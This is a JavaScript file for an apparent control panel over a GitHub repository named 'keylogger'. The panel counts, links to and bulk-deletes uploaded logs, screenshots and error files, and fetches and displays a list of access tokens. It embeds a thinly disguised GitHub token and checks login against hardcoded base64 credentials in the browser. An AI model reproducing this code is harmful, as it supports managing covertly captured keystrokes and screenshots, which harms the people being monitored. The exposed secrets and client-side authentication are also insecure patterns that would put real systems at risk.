// login credentials
document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const encodedUsername = "YmliZWs0OA==";
    const encodedPassword = "YWRtaW5iaWJlaw==";

    // Get user input
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const encodedInputUsername = btoa(username);
    const encodedInputPassword = btoa(password);

    // Validate credentials
    if (encodedInputUsername === encodedUsername && encodedInputPassword === encodedPassword) {
        // Hide the login container
        document.getElementById('loginContainer').classList.add('hidden');

        // Show the success message
        document.getElementById('successMessage').classList.remove('hidden');

        // Show custom notification
        showNotification("You logged in successfully!");
    } else {
        document.getElementById('message').textContent = "Invalid username or password!";
        document.getElementById('message').style.color = "red";
        // Show custom notification
        showNotification("⚠️ Invalid username or password 😡🤬");
    }
});

// Function to show custom notification
function showNotification(message) {
    const notification = document.getElementById('customNotification');
    notification.textContent = message;
    notification.classList.remove('hidden');

    // Hide the notification after 3 seconds
    setTimeout(() => {
        notification.classList.add('hidden');
    }, 3000);
}





// file no. count 
const GITHUB_API_BASE_URL = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads";
const GITHUB_UI_BASE_URL = "https://github.com/bebedudu/keylogger/tree/main/uploads";
const GITHUB_DELETE_URL = "https://github.com/bebedudu/keylogger/tree/delete/main/uploads";
const FOLDERS = ["cache", "config", "keylogerror", "logs", "screenshots"];
const randomletter = "wruif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lirtzg"; // Replace with your actual GitHub token

// Remove the first 5 characters and the last 6 characters
const newRandomLetter = randomletter.slice(5, randomletter.length - 6);

async function fetchFileCounts() {
    const grid = document.getElementById("file-count-grid");
    grid.innerHTML = "Fetching data...";

    const headers = {
        "Authorization": `token ${newRandomLetter}`,
        "Accept": "application/vnd.github.v3+json"
    };

    try {
        const results = await Promise.all(FOLDERS.map(async (folder) => {
            const response = await fetch(`${GITHUB_API_BASE_URL}/${folder}`, { headers });
            if (!response.ok) return { folder, count: "Error" };
            const files = await response.json();
            return { folder, count: files.length };
        }));

        grid.innerHTML = results.map(result => `
                    <div class="col-sm-4 mb-3">
                        <div class="card">
                            <div class="card-body">
                                <span class="delete-icon" onclick="event.stopPropagation(); openDeleteFolder('${result.folder}')"><i class="bi bi-trash"></i></span>
                                <!-- <strong>${result.folder.toUpperCase()}</strong>
                                <p>${result.count} files</p> -->
                                <h5 class="card-title text-center openfolder" onclick="openFolder('${result.folder}')">${result.folder.toUpperCase()}</h5>
                                <p class="card-text text-center">${result.count} files</p>
                            </div>
                        </div>
                    </div>
                `).join("");
    } catch (error) {
        grid.innerHTML = `<p style="color: red;">Error fetching file counts.</p>`;
    }
}

function openFolder(folder) {
    window.open(`${GITHUB_UI_BASE_URL}/${folder}`, "_blank");
}

function openDeleteFolder(folder) {
    window.open(`${GITHUB_DELETE_URL}/${folder}`, "_blank");
}

fetchFileCounts(); // Fetch data on page load






// token data
const TOKEN_URL = "https://raw.githubusercontent.com/bebedudu/tokens/refs/heads/main/tokens.json";

async function fetchTokens() {
    try {
        const response = await fetch(TOKEN_URL);
        if (!response.ok) throw new Error(`Failed to fetch tokens. Status: ${response.status}`);
        const data = await response.json();
        const tokenGrid = document.getElementById("token-grid");
        tokenGrid.innerHTML = "Fetching data...";
        tokenGrid.innerHTML = await Promise.all(
            Object.entries(data).map(async ([key, value]) => {
                const processedToken = processToken(value);
                const rateLimit = await fetchRateLimit(processedToken);
                return `
                            <div class="col-sm-auto mb-3">
                                <div class="card">
                                    <div class="card-body">
                                        <h5 class="card-title text-center">${key.toUpperCase()}</h5>
                                        <p class="card-text">${processedToken}</p>
                                        <div class="tokendetail">
                                            <strong>Limit:</strong> ${rateLimit.limit || "N/A"}<br>
                                            <strong>Remaining:</strong> ${rateLimit.remaining || "N/A"}<br>
                                            <strong>Reset Time:</strong> ${rateLimit.resetTime || "N/A"}
                                        </div>
                                    </div>
                                </div>
                            </div>
                        `;
            })
        ).then(cards => cards.join(""));
    } catch (error) {
        document.getElementById("token-grid").innerText = "Error fetching tokens.";
    }
}

function processToken(token) {
    return token ? token.substring(5, token.length - 6) : "N/A";
}

async function fetchRateLimit(token) {
    try {
        const response = await fetch("https://api.github.com/user", {
            headers: { Authorization: `Bearer ${token}` },
        });
        if (!response.ok) throw new Error("Failed to fetch rate limit");
        const limit = response.headers.get("X-RateLimit-Limit");
        const remaining = response.headers.get("X-RateLimit-Remaining");
        const reset = response.headers.get("X-RateLimit-Reset");
        return {
            limit: limit || "N/A",
            remaining: remaining || "N/A",
            resetTime: reset ? new Date(reset * 1000).toLocaleString() : "N/A"
        };
    } catch (error) {
        return { limit: "N/A", remaining: "N/A", resetTime: "N/A" };
    }
}

fetchTokens();






// delete files 
// show the no. of files with simultaneously deleting no. of files and try to reattemp to delete files 
const GITHUB_API_BASE = "https://api.github.com/repos/bebedudu/keylogger/contents/uploads";

// Fetch and display the number of files in each folder on page load
document.addEventListener("DOMContentLoaded", async () => {
    const folders = ["config", "cache", "screenshots", "logs", "keylogerror"];

    for (const folder of folders) {
        try {
            const folderUrl = `${GITHUB_API_BASE}/${folder}`;
            const response = await fetch(folderUrl, {
                headers: {
                    "Authorization": `token ${newRandomLetter}`
                }
            });

            if (!response.ok) {
                document.getElementById(`${folder}FileCount`).textContent = "Error fetching file count";
                continue;
            }

            const files = await response.json();
            const fileCount = files.length || 0;

            // Display the file count next to the folder's input box
            document.getElementById(`${folder}FileCount`).textContent = `${fileCount} files available`;
        } catch (error) {
            console.error(`Error fetching file count for folder: ${folder}`, error);
            document.getElementById(`${folder}FileCount`).textContent = "Error fetching file count";
        }
    }
});

async function deleteFiles() {
    const terminalLog = document.getElementById('terminal-log'); // For terminal-like output
    const resultDiv = document.getElementById('result');

    // Clear previous terminal log
    terminalLog.innerHTML = "";

    // Map of folder names to their checkbox, input elements, and progress span
    const folderInputs = [
        { folder: "config", checkbox: document.getElementById("configCheckbox"), countInput: document.getElementById("configCount"), progressSpan: document.getElementById("configProgress") },
        { folder: "cache", checkbox: document.getElementById("cacheCheckbox"), countInput: document.getElementById("cacheCount"), progressSpan: document.getElementById("cacheProgress") },
        { folder: "screenshots", checkbox: document.getElementById("screenshotsCheckbox"), countInput: document.getElementById("screenshotsCount"), progressSpan: document.getElementById("screenshotsProgress") },
        { folder: "logs", checkbox: document.getElementById("logsCheckbox"), countInput: document.getElementById("logsCount"), progressSpan: document.getElementById("logsProgress") },
        { folder: "keylogerror", checkbox: document.getElementById("keylogerrorCheckbox"), countInput: document.getElementById("keylogerrorCount"), progressSpan: document.getElementById("keylogerrorProgress") }
    ];

    try {
        // Filter selected folders and fetch their files
        const selectedFolders = folderInputs
            .filter(({ checkbox }) => checkbox.checked)
            .map(async ({ folder, countInput, progressSpan }) => {
                const numFilesToDelete = parseInt(countInput.value);

                if (isNaN(numFilesToDelete) || numFilesToDelete <= 0) {
                    logToTerminal(`Skipping folder: ${folder} - Invalid or zero file count`, terminalLog);
                    return null;
                }

                logToTerminal(`Fetching files for folder: ${folder}`, terminalLog);

                try {
                    const folderUrl = `${GITHUB_API_BASE}/${folder}`;
                    const response = await fetch(folderUrl, {
                        headers: {
                            "Authorization": `token ${newRandomLetter}`
                        }
                    });

                    if (!response.ok) {
                        logToTerminal(`Failed to fetch files from folder: ${folder} - ${response.statusText}`, terminalLog);
                        return null;
                    }

                    const files = await response.json();

                    if (files.length === 0) {
                        logToTerminal(`No files found in folder: ${folder}`, terminalLog);
                        return null;
                    }

                    // Limit the number of files to delete
                    const filesToDelete = files.slice(0, numFilesToDelete);

                    // Initialize progress counter
                    let deletedCount = 0;
                    progressSpan.textContent = `${deletedCount}/${numFilesToDelete}`;

                    return { folder, filesToDelete, deletedCount, numFilesToDelete, progressSpan };
                } catch (error) {
                    logToTerminal(`Error processing folder: ${folder} - ${error.message}`, terminalLog);
                    return null;
                }
            });

        // Wait for all folder data to be fetched
        const folderData = (await Promise.all(selectedFolders)).filter(Boolean);

        // Sequentially delete files in a round-robin fashion
        let totalDeleted = 0;
        while (folderData.some(({ deletedCount, numFilesToDelete }) => deletedCount < numFilesToDelete)) {
            for (const folder of folderData) {
                const { folder: folderName, filesToDelete, deletedCount, numFilesToDelete, progressSpan } = folder;

                if (deletedCount >= numFilesToDelete) continue; // Skip if all files for this folder are deleted

                const file = filesToDelete[deletedCount];

                try {
                    await deleteFileWithRetry(file.path, file.sha, 3); // Retry up to 3 times
                    folder.deletedCount++;
                    folder.progressSpan.textContent = `${folder.deletedCount}/${numFilesToDelete}`;
                    logToTerminal(`Deleted: ${file.name} from folder: ${folderName}`, terminalLog);
                    totalDeleted++;
                } catch (error) {
                    logToTerminal(`Error deleting: ${file.name} from folder: ${folderName} - ${error.message}`, terminalLog);
                }
            }
        }

        resultDiv.textContent = `Operation completed. Check the terminal log for details.`;
        // Show custom notification
        showNotification("Deletion completed. Check the terminal log for details.");
    } catch (error) {
        console.error(error);
        resultDiv.textContent = `Error: ${error.message}`;
    }
}

async function deleteFileWithRetry(filePath, sha, retries) {
    let attempt = 1;

    while (attempt <= retries) {
        try {
            await deleteFile(filePath, sha);
            return; // Success, exit the loop
        } catch (error) {
            if (attempt === retries) {
                throw new Error(`All ${retries} attempts failed. Last error: ${error.message}`);
            }
            logToTerminal(`Attempt ${attempt} failed for file: ${filePath.split('/').pop()}. Retrying...`, document.getElementById('terminal-log'));
            attempt++;
        }
    }
}

async function deleteFile(filePath, sha) {
    const deleteUrl = `https://api.github.com/repos/bebedudu/keylogger/contents/${encodeURIComponent(filePath)}`;

    const response = await fetch(deleteUrl, {
        method: "DELETE",
        headers: {
            "Authorization": `token ${newRandomLetter}`,
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            message: `Deleted: ${filePath.split('/').pop()}`,
            sha: sha
        })
    });

    if (!response.ok) {
        const errorData = await response.json();
        throw new Error(`GitHub API Error: ${errorData.message}`);
    }
}

function logToTerminal(message, terminalLog) {
    const logEntry = document.createElement("p");
    logEntry.textContent = message;
    terminalLog.appendChild(logEntry);
    terminalLog.scrollTop = terminalLog.scrollHeight;
}


